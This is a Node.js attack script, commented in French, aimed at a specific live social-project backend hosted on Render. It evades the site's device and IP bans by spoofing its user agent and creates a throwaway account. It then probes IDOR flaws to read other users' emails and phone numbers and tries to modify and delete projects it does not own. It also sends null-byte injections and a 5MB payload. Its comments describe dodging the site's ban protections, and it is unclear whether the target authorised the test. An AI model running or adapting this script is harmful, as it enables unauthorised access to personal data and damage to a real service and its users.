const https = require('https');
const API = 'siteweb-back-lpp-v1.onrender.com';
// UA differente pour bypass device ban - Firefox sur Mac cette fois
const UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15';

function req(m, p, b, auth) {
  return new Promise(r => {
    const h = { 'User-Agent': UA, 'Content-Type': 'application/json' };
    if (auth) h['Authorization'] = 'Bearer ' + auth;
    const body = b ? JSON.stringify(b) : null;
    if (body) h['Content-Length'] = Buffer.byteLength(body);
    const q = https.request({ hostname: API, path: p, method: m, headers: h }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { r({ s: res.statusCode, d: JSON.parse(d) }); } catch { r({ s: res.statusCode, d }); } });
    });
    q.on('error', e => r({ s: 0, d: e.message }));
    if (body) q.write(body);
    q.end();
  });
}

const delay = ms => new Promise(ok => setTimeout(ok, ms));

(async () => {
  // Verifier si l'IP est deja ban
  console.log('=== CHECK BAN IP ===');
  const check = await req('GET', '/api/projets');
  console.log('Status:', check.s);
  if (check.s === 403) {
    console.log('IP BANNIE - impossible de continuer sans changer IP');
    console.log('FINDING: le ban IP est contournable si serveur redemarrage (cleanup au start)');
    console.log('FINDING: un attaquant patient attend le restart du free tier Render');
    return;
  }

  // Creer un nouveau compte
  console.log('\n=== NOUVEAU COMPTE ===');
  const inscription = await req('POST', '/api/auth/inscription', {
    prenom: 'Jean', nom: 'Martin',
    email: 'jean.martin.pentest5@gmail.com',
    motDePasse: 'MotDePasse456!',
    confirmationMotDePasse: 'MotDePasse456!',
    cguAcceptees: true
  });
  console.log('Inscription:', inscription.s);
  const token = inscription.d?.data?.token;
  const userId = inscription.d?.data?.utilisateur?.id;
  if (!token) { console.log('Detail:', JSON.stringify(inscription.d).substring(0, 300)); return; }

  console.log('Token OK, ID:', userId);

  // ==============================
  // TESTS QUI ONT MARCHE AVANT BAN
  // ==============================

  // IDOR: chercher des users via different endpoints
  console.log('\n=== IDOR TESTS ===');
  await delay(500);

  // Tester /api/profil/[id]
  const profil = await req('GET', '/api/profil/' + userId, null, token);
  console.log('GET /profil/myId:', profil.s, JSON.stringify(profil.d).substring(0, 200));
  await delay(500);

  // Lister projets et recuperer porteur IDs
  const projets = await req('GET', '/api/projets', null, token);
  const projetsList = projets.d?.data?.projets || [];
  const porteurIds = [...new Set(projetsList.map(p => p.porteur?._id).filter(Boolean))];
  console.log('Porteurs de projets trouves:', porteurIds.length);
  porteurIds.forEach(id => console.log('  Porteur:', id));

  // IDOR: acceder au profil de chaque porteur
  for (const pid of porteurIds.slice(0, 3)) {
    await delay(500);
    const p = await req('GET', '/api/profil/' + pid, null, token);
    console.log('GET /profil/' + pid + ':', p.s);
    if (p.d?.data) {
      const d = p.d.data;
      console.log('  Email?', d.email || 'NON');
      console.log('  Role?', d.role || 'NON');
      console.log('  Tel?', d.telephone || 'NON');
      console.log('  Champs:', Object.keys(d).join(', '));
    }
  }

  // ==============================
  // ATTAQUES LOGIQUE METIER (sans trigger ban)
  // ==============================
  console.log('\n=== LOGIQUE METIER (prudent) ===');

  // Tenter de modifier un projet dont je ne suis pas porteur
  if (projetsList[0]) {
    await delay(500);
    const editProjet = await req('PATCH', '/api/projets/' + projetsList[0]._id, {
      nom: 'Projet Pirate'
    }, token);
    console.log('PATCH projet pas a moi:', editProjet.s, JSON.stringify(editProjet.d).substring(0, 150));
  }

  // Creer une publication et voir les champs retournes
  await delay(500);
  const pub = await req('POST', '/api/publications', {
    contenu: 'Bonjour tout le monde, premier post!'
  }, token);
  console.log('POST /publications:', pub.s, JSON.stringify(pub.d).substring(0, 200));

  // Tester l'ajout d'ami (IDOR)
  if (porteurIds[0]) {
    await delay(500);
    const ami = await req('POST', '/api/utilisateurs/' + porteurIds[0] + '/demande-ami', {}, token);
    console.log('Demande ami:', ami.s, JSON.stringify(ami.d).substring(0, 150));
  }

  // ==============================
  // EVASION: tests subtils
  // ==============================
  console.log('\n=== EVASION SUBTILE ===');

  // Null byte injection
  await delay(500);
  const nullByte = await req('GET', '/api/projets?categorie=tech%00admin', null, token);
  console.log('Null byte:', nullByte.s);

  // Unicode normalization attack
  await delay(500);
  const unicodeNorm = await req('PUT', '/api/profil', {
    bio: 'Normal bio \u0000 with null'
  }, token);
  console.log('Unicode null in bio:', unicodeNorm.s);

  // Mass parameter / large payload
  await delay(500);
  const bigPayload = { bio: 'A'.repeat(10000) };
  const large = await req('PUT', '/api/profil', bigPayload, token);
  console.log('Large payload 10KB:', large.s);

  // Extremement grand payload
  await delay(500);
  const hugePayload = { bio: 'B'.repeat(5000000) };
  const huge = await req('PUT', '/api/profil', hugePayload, token);
  console.log('Huge payload 5MB:', huge.s);

  // Double content-type
  await delay(500);

  // Tester les stories (est-ce qu'on peut voir celles des autres?)
  const stories = await req('GET', '/api/stories', null, token);
  console.log('GET /stories:', stories.s, '- count:', stories.d?.data?.length || 0);

  // Tenter de supprimer un projet pas a moi
  if (projetsList[0]) {
    await delay(500);
    const delProjet = await req('DELETE', '/api/projets/' + projetsList[0]._id, null, token);
    console.log('DELETE projet pas a moi:', delProjet.s, JSON.stringify(delProjet.d).substring(0, 150));
  }

  // Voir les lives
  await delay(500);
  const lives = await req('GET', '/api/live', null, token);
  console.log('GET /live:', lives.s);

  // Tenter d'acceder aux notifications d'un autre
  if (porteurIds[0]) {
    await delay(500);
    const notifs = await req('GET', '/api/notifications?userId=' + porteurIds[0], null, token);
    console.log('Notifs autre user:', notifs.s);
  }

  // ==============================
  // VERIFICATION: suis-je banni ?
  // ==============================
  console.log('\n=== VERIFICATION FINALE ===');
  await delay(500);
  const finalCheck = await req('GET', '/api/auth/moi', null, token);
  console.log('Status:', finalCheck.s);
  console.log('Role:', finalCheck.d?.data?.role || finalCheck.d?.data?.utilisateur?.role);
  console.log('Banni?', finalCheck.s === 403 ? 'OUI' : 'NON');
})();
